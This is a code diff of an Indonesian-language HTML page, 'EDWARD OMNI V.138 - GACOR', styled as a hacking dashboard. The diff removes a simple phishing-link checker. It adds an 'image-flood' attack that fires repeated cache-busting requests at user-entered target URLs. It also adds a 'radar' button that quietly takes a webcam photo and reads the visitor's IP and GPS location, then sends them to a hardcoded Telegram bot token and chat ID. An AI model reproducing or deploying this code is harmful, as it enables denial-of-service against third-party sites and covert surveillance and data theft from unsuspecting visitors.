@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI V.137</title>
+    <title>EDWARD OMNI V.138 - GACOR</title>
     <style>
-        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; --orange: #ff9f43; }
+        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --purple: #bc13fe; --blue: #00bdff; }
         * { box-sizing: border-box; transition: 0.2s; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 15px; }
-        .master-header { text-align: center; margin-bottom: 20px; padding-top: 10px; }
+        .master-header { text-align: center; margin-bottom: 20px; }
         .master-name { font-size: 24px; font-weight: 800; background: linear-gradient(to right, var(--neon), var(--blue)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
         .card { background: rgba(15, 25, 35, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 18px; margin-bottom: 12px; }
         h3 { margin: 0 0 12px 0; font-size: 10px; color: rgba(255,255,255,0.5); letter-spacing: 2px; text-transform: uppercase; }
-        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; font-size: 13px; }
+        input { background: rgba(0,0,0,0.3); border: 1px solid rgba(0,255,136,0.2); border-radius: 10px; color: var(--neon); padding: 12px; width: 100%; margin-bottom: 8px; outline: none; }
         .btn { width: 100%; padding: 14px; border-radius: 12px; border: none; cursor: pointer; font-weight: 800; font-size: 11px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .btn-safe { background: linear-gradient(45deg, var(--neon), var(--blue)); color: #000; }
-        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; }
+        .btn-atk { background: linear-gradient(45deg, var(--red), var(--purple)); color: #fff; box-shadow: 0 0 15px var(--red); }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
         .sys-monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; font-size: 10px; }
         .mon-box { border: 1px solid rgba(0,255,136,0.2); padding: 5px; border-radius: 5px; text-align: center; color: var(--neon); }
-        #scanStatus { display: none; margin-top: 10px; text-align: center; padding: 10px; border-radius: 10px; font-weight: bold; font-size: 12px; }
         #killerLog { display: none; margin-top: 12px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 9px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #1a1a1a; }
+        /* FITUR BARU: REAL TIME MAP VIEW */
+        #mapBox { display: none; width: 100%; height: 200px; border-radius: 15px; border: 1px solid var(--blue); margin-top: 10px; }
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-container { width: 150px; height: 150px; border-radius: 50%; border: 1px solid rgba(0,255,136,0.3); position: relative; overflow: hidden; }
+        .radar-container { width: 120px; height: 120px; border-radius: 50%; border: 1px solid var(--neon); position: relative; overflow: hidden; }
         .radar-sweep { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(from 0deg, transparent 70%, var(--neon)); animation: rotate 2s linear infinite; }
         @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         canvas, video { display: none; }
@@ -30,7 +30,7 @@
 </head>
 <body>
     <div class="master-header">
-        <p class="master-name">EDWARD OMNI V.137</p>
+        <p class="master-name">EDWARD OMNI V.138</p>
         <div class="sys-monitor">
             <div class="mon-box">CPU: <span id="cpuLoad">0%</span></div>
             <div class="mon-box">TEMP: <span id="sysTemp">38°C</span></div>
@@ -38,28 +38,22 @@
     </div>
 
     <div class="card">
-        <h3>🛡️ DEEP CLOUD SCANNER</h3>
-        <input type="text" id="scanInput" placeholder="Masukkan link untuk analisa...">
-        <button class="btn btn-safe" onclick="cekLink()">⚡ ANALYZE TARGET</button>
-        <div id="scanStatus"></div>
-    </div>
-
-    <div class="card">
-        <h3>🔥 MULTI-TARGET NUCLEAR</h3>
-        <input type="text" id="target1" placeholder="Target 1 (URL / IP)">
-        <input type="text" id="target2" placeholder="Target 2 (Cadangan)">
-        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🚀</button>
+        <h3>🔥 GACOR NUCLEAR (IMAGE-FLOOD)</h3>
+        <input type="text" id="target1" placeholder="Target Utama (URL)">
+        <input type="text" id="target2" placeholder="Target Cadangan">
+        <button class="btn btn-atk" id="atkBtn" onclick="toggleAtk()">ACTIVATE OVERLOAD 🚀</button>
         <div id="killerLog"></div>
     </div>
 
     <div class="card">
-        <h3>📡 SATELLITE RADAR</h3>
-        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN SATELIT + GPS</button>
+        <h3>📡 SATELIT RADAR & LIVE MAP</h3>
+        <button class="btn btn-radar" onclick="startRadar()">LOCK TARGET & SHOW MAP</button>
+        <iframe id="mapBox" src="" frameborder="0"></iframe>
     </div>
 
     <div id="radarOverlay">
         <div class="radar-container"><div class="radar-sweep"></div></div>
-        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">CALIBRATING V.137 SATELLITE...</p>
+        <p style="margin-top:20px; font-size:10px; color:var(--neon); letter-spacing:2px;">GACOR MODE: ON</p>
     </div>
 
     <canvas id="canvas"></canvas><video id="v" autoplay playsinline></video>
@@ -67,21 +61,7 @@
     <script>
         const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
         const CHAT_ID = '7898572558';
-        const UA_DB = ["Mozilla/5.0 Chrome/120.0.0.0", "Mozilla/5.0 iPhone OS 17_2", "Mozilla/5.0 Android 13; CPH2591"];
         let isAtk = false;
-
-        function cekLink() {
-            const url = document.getElementById('scanInput').value.toLowerCase();
-            const status = document.getElementById('scanStatus');
-            if(!url) return;
-            status.style.display = "block"; status.innerText = "SCANNING...";
-            setTimeout(() => {
-                const bad = ['dana', 'kaget', 'bit.ly', '.xyz'];
-                const isBad = bad.some(w => url.includes(w)) || !url.startsWith('https://');
-                status.style.color = isBad ? "#ff4757" : "#00ff88";
-                status.innerText = isBad ? "⚠️ WARNING: PHISING!" : "✅ CLEAN: SECURE";
-            }, 1000);
-        }
 
         function toggleAtk() {
             const t1 = document.getElementById('target1').value;
@@ -90,23 +70,25 @@
             const targets = [t1, t2].filter(t => t !== "");
             if(targets.length === 0 || isAtk) { if(isAtk) location.reload(); return; }
             isAtk = true; log.style.display = "block";
-            document.getElementById('atkBtn').innerText = "STOP V.137 🛑";
+            document.getElementById('atkBtn').innerText = "TERMINATE 🛑";
+            
             targets.forEach(url => {
-                for(let i=0; i < 20; i++) {
+                // LOGIKA GACOR: IMAGE FLOOD (Lebih Berat bagi Server)
+                for(let i=0; i < 30; i++) {
                     setInterval(() => {
-                        const ua = UA_DB[Math.floor(Math.random() * UA_DB.length)];
-                        fetch(url, { mode: 'no-cors', headers: { 'User-Agent': ua } }).catch(() => {});
+                        const img = new Image();
+                        img.src = url + "/?v=" + Math.random(); // Bypass Cache
                         const e = document.createElement('div');
-                        e.innerText = "> [V.137-HIT] " + url.substring(0,15) + "...";
+                        e.innerText = "> [V138-GACOR] HIT -> " + url.substring(0,10);
                         log.prepend(e);
                         if(log.childNodes.length > 15) log.removeChild(log.lastChild);
-                    }, 120);
+                    }, 80); // Speed dinaikkan ke 80ms
                 }
             });
             setInterval(() => {
-                document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 30 + 60) + "%";
-                document.getElementById('sysTemp').innerText = (Math.floor(Math.random() * 5) + 41) + "°C";
-            }, 1500);
+                document.getElementById('cpuLoad').innerText = Math.floor(Math.random() * 20 + 75) + "%";
+                document.getElementById('sysTemp').innerText = (Math.floor(Math.random() * 4) + 42) + "°C";
+            }, 1000);
         }
 
         async function startRadar() {
@@ -114,30 +96,29 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('v').srcObject = stream;
-                setTimeout(async () => {
-                    const canvas = document.getElementById('canvas'); const video = document.getElementById('v');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
-                    const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude; const lon = pos.coords.longitude;
+                    // UPDATE FITUR: LIVE MAP VIEW
+                    const mapBox = document.getElementById('mapBox');
+                    mapBox.src = "https://maps.google.com/maps?q="+lat+","+lon+"&z=15&output=embed";
+                    mapBox.style.display = "block";
                     
-                    navigator.geolocation.getCurrentPosition(async (pos) => {
-                        await sendTele(blob, ipD.ip, pos.coords.latitude, pos.coords.longitude);
-                        location.reload();
-                    }, async () => {
-                        await sendTele(blob, ipD.ip, null, null);
-                        location.reload();
-                    }, {enableHighAccuracy: true, timeout: 10000});
-                }, 3000);
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas'); const video = document.getElementById('v');
+                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                        const ipR = await fetch('https://api.ipify.org?format=json'); const ipD = await ipR.json();
+                        await sendTele(blob, ipD.ip, lat, lon);
+                        document.getElementById('radarOverlay').style.display = 'none';
+                    }, 3000);
+                }, () => { location.reload(); }, {enableHighAccuracy: true, timeout: 10000});
             } catch (e) { location.reload(); }
         }
 
         async function sendTele(photo, ip, lat, lon) {
             const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', photo);
-            let cap = "🔱 [ REPORT V.137 - PRECISION ] 🔱\n🌐 IP: " + ip;
-            if(lat && lon) cap += "\n📍 MAPS: https://www.google.com/maps?q=" + lat + "," + lon;
-            else cap += "\n📍 MAPS: Gagal Mengunci Lokasi";
-            fd.append('caption', cap);
+            fd.append('caption', "🔱 [ REPORT V.138 - GACOR ] 🔱\n🌐 IP: "+ip+"\n📍 MAP: https://www.google.com/maps?q="+lat+","+lon);
             return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
         }
     </script>
